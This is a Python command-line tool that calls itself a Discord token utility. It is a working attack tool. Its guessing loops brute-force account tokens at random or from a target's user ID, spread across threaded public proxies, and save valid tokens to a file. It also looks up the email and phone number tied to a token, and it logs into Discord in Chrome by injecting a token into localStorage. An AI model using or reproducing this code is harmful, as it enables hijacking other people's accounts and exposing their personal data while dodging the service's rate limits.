import base64
from requests import get
import json
from selenium import webdriver
import time
import os
import platform
import random
import threading

Invalid_token = 0
Valid_token = 0

class Colors:
    end = '\x1b[0m'
    green = '\x1b[0;32m'
    red = '\x1b[1;31m'

def updatetitle():
    if platform.system() == 'Windows':
        os.system("title Discord Token")
def clear():
    if platform.system() != 'Windows':
        os.system('clear')
        return None
    os.system('cls')

def tokeninfo():
	logo()
	token = input('  Token > ')
	headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
	src = get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
	response = json.loads(src.content)

	if src.status_code == 200:
		print(f"{Colors.green}  [*] Token Is Valid{Colors.end}")
		time.sleep(0.5)
		avatar_id = response['avatar']
		infotk = f'''

	Name :  {response['username']}#{response['discriminator']}
	ID :  {response['id']}
	Email :  {response['email']}			verif : {response['verified']}
	Phone :  {response['phone']}
	Language :  {response['locale']}
	Avatar URL :  https://cdn.discordapp.com/avatars/{response['id']}/{avatar_id}.gif
	Token :  {token} 


		'''
		print(infotk)
		a = input("  Press 'Enter' to exit > ")
		choices()

	else:
		print(f"{Colors.red}  [*] Token Is Invalid{Colors.end}")
		time.sleep(3)
		choices()

def tokenLogin():
	logo()
	token = input('  Token > ')
	headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

	src = get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
	if src.status_code == 403:
		print(f"{Colors.red}  [*] Token Is Invalid{Colors.end}")
		time.sleep(3)
		choices()

	elif src.status_code == 401:
		print("Token Is Invalid")
		choices()
	else:
		opts = webdriver.ChromeOptions()
		opts.add_experimental_option("detach", True)
		driver = webdriver.Chrome('chromedriver.exe', options=opts)
		script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
		driver.get("https://discord.com/login")
		driver.execute_script(script + f'\nlogin("{token}")')

def spectok():
	data = input("ID : ")
	encodedBytes = base64.b64encode(data.encode("utf-8"))#encoding to base64 
	FirstPart = str(encodedBytes, "utf-8")
	print(f"First Part of Token is : {FirstPart}")
	time.sleep(0.5)
	randome(FirstPart)

def randome(ran):
	def main(proxie, ran):
		while True:
			try:
				with open("token_true.txt", "w+") as f: pass
				def rand(num):
					All = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789"
					ale = ""
					for i in range(num):
						j = random.randint(0, 60)
						ale = f"{ale}{All[j]}"
					return ale
				if ran != "":
					token = f"{ran}.{rand(6)}.{rand(27)}"
				else:
					token = f"{rand(24)}.{rand(6)}.{rand(27)}"

				headers = {
					'Authorization': token,
					'Content-Type': 'application/json',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
				}
				proxies = {"https": proxie}
				src = get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10, proxies=proxies)
				response = json.loads(src.content)
				if src.status_code == 403:
					print(f"INVALID | {token}  proxies : {proxie}")
				elif src.status_code == 401:
					print(f"INVALID | {token}  proxies : {proxie}")
				else:
					with open("token_true.txt", "r+") as f:
						content = f.read()
					with open("token_true.txt", "w+") as f:
						print(f"VALID | {token} | VALID")
						f.write(f"{content}\ntoken : {token}")

			except Exception as e:
				pass
	r = get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt')
	data = r.text
	data = data.splitlines()
	for i in data:
		threading.Thread(target=main, args=(i,ran,)).start()

def logo():
	clear()
	logo = f'''{Colors.green}
		  _____  _                       _   _______    _              
		 |  __ \\(_)                     | | |__   __|  | |             
		 | |  | |_ ___  ___ ___  _ __ __| |    | | ___ | | _____ _ __  
		 | |  | | / __|/ __/ _ \\| '__/ _` |    | |/ _ \\| |/ / _ \\ '_ \\ 
		 | |__| | \\__ \\ (_| (_) | | | (_| |    | | (_) |   <  __/ | | |
		 |_____/|_|___/\\___\\___/|_|  \\__,_|    |_|\\___/|_|\\_\\___|_| |_|

		 			Made By Marin                                                                 
{Colors.end}'''
	print(logo)

def choices():
	logo()
	print(f'''
    │ {Colors.green}Options :{Colors.end}
    ├──────────
    │
    │		TOKENS :
    │
    │ [{Colors.green}1{Colors.end}] Token Infos
    │ [{Colors.green}2{Colors.end}] Crack random Token
    │ [{Colors.green}3{Colors.end}] Crack specifique Token with ID
    │ [{Colors.green}4{Colors.end}] Connect discord with Token (Requiert chromedriver)
    │ [{Colors.green}5{Colors.end}] Exit
    │''')
	choice = input("    └───> ")
	if choice == "1": tokeninfo()
	elif choice == "2": randome("")
	elif choice == "3": spectok()
	elif choice == "4": tokenLogin()

updatetitle()
choices()